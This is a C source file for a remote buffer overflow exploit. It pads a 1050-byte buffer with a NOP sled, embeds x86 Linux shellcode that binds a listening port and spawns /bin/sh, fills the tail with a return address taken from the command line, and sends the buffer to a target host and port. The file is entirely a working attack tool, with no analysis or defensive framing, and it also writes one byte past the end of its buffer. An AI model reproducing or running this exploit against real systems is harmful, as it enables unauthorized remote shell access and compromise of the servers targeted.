#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>

char shellcode[] =
/* main: */
    "\xeb\x72"            /* jmp line */
/* start: */
    "\x5e"                /* popl %esi */
/* socket(AF_INET, SOCK_STREAM, 0) */
    "\x31\xc0"            /* xorl %eax, %eax */
    "\x89\x46\x10"        /* movl %eax, 0x10(%esi) */
    "\x40"                /* incl %eax */
    "\x89\xc3"            /* movl %eax, %ebx */
    "\x89\x46\x0c"        /* movl %eax, 0x0c(%esi) */
    "\x40"                /* incl %eax */
    "\x89\x46\x08"        /* movl %eax, 0x08(%esi) */
    "\x8d\x4e\x08"        /* leal 0x08(%esi), %ecx */
    "\xb0\x66"            /* movb $0x66, %al */
    "\xcd\x80"            /* int $0x80 */
/* bind(sd, (struct sockaddr *)&servaddr, sizeof(servaddr)) */
    "\x43"                /* incl %ebx */
    "\xc6\x46\x10\x10"    /* movb $0x10, 0x10(%esi) */
    "\x66\x89\x5e\x14"    /* movw %bx, 0x14(%esi) */
    "\x88\x46\x08"        /* movb %al, 0x08(%esi) */
    "\x31\xc0"            /* xorl %eax, %eax */
    "\x89\xc2"            /* movl %eax, %edx */
    "\x89\x46\x18"        /* movl %eax, 0x18(%esi) */
    "\xb0\x77"            /* movb $0x77, %al */
    "\x66\x89\x46\x16"    /* movw %ax, 0x16(%esi) */
    "\x8d\x4e\x14"        /* leal 0x14(%esi), %ecx */
    "\x89\x4e\x0c"        /* movl %ecx, 0x0c(%esi) */
    "\x8d\x4e\x08"        /* leal 0x08(%esi), %ecx */
    "\xb0\x66"            /* movb $0x66, %al */
    "\xcd\x80"            /* int $0x80 *//* listen(sd, 1) */
    "\x89\x5e\x0c"        /* movl %ebx, 0x0c(%esi) */
    "\x43"                /* incl %ebx */
    "\x43"                /* incl %ebx */
    "\xb0\x66"            /* movb $0x66, %al */
    "\xcd\x80"            /* int $0x80 *//* accept(sd, NULL, 0) */
    "\x89\x56\x0c"        /* movl %edx, 0x0c(%esi) */
    "\x89\x56\x10"        /* movl %edx, 0x10(%esi) */
    "\xb0\x66"            /* movb $0x66, %al */
    "\x43"                /* incl %ebx */
    "\xcd\x80"            /* int $0x80 *//* dup2(cli, 0) */
    "\x86\xc3"            /* xchgb %al, %bl */
    "\xb0\x3f"            /* movb $0x3f, %al */
    "\x31\xc9"            /* xorl %ecx, %ecx */
    "\xcd\x80"            /* int $0x80 *//* dup2(cli, 1) */
    "\xb0\x3f"            /* movb $0x3f, %al */
    "\x41"                /* incl %ecx */
    "\xcd\x80"            /* int $0x80 *//* dup2(cli, 2) */
    "\xb0\x3f"            /* movb $0x3f, %al */
    "\x41"                /* incl %ecx */
    "\xcd\x80"            /* int $0x80 *//* execl() */
    "\x88\x56\x07"        /* movb %dl, 0x07(%esi) */
    "\x89\x76\x0c"        /* movl %esi, 0x0c(%esi) */
    "\x87\xf3"            /* xchgl %esi, %ebx */
    "\x8d\x4b\x0c"        /* leal 0x0c(%ebx), %ecx */
    "\xb0\x0b"            /* movb $0x0b, %al */
    "\xcd\x80"            /* int $0x80 */
/* line: */
    "\xe8\x89\xff\xff\xff"  /* call start */
    "/bin/sh";

int main(int argc, char *argv[])
{
  char buf[1050];
  long ret;
  char *ptr;
  long *addr_ptr;
  int sd, i;
  struct hostent *hp;
  struct sockaddr_in remote;

  if(argc != 4) {
    fprintf(stderr, "Usage: %s <target> <port> <ret>\n", argv[0]);
    exit(-1);
  }
	       
  ret = strtoul(argv[3], NULL, 16);

  memset(buf, 0x90, 1050);
  memcpy(buf+1001-sizeof(shellcode) , shellcode, sizeof(shellcode));
  buf[1000] = 0x90;
  for(i = 1002; i < 1046; i += 4) {
    * ((int *) &buf[i]) = ret;
  }
  buf[1050] = 0x0;

  if ( (hp = gethostbyname(argv[1])) == NULL) {
    herror("gethostbyname() failed");
    exit(-1);
  }
  
  if ( (sd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
    perror("socket() failed");
    exit(-1);
  }
              
  remote.sin_family = AF_INET;
  remote.sin_addr = *((struct in_addr *)hp->h_addr);
  remote.sin_port = htons(atoi(argv[2]));

  if (connect(sd, (struct sockaddr *)&remote, sizeof(remote)) == -1) {
    perror("connect() failed");
    close(sd);
    exit(-1);
  }
  
  send(sd, buf, sizeof(buf), 0);
  
  close(sd);
}

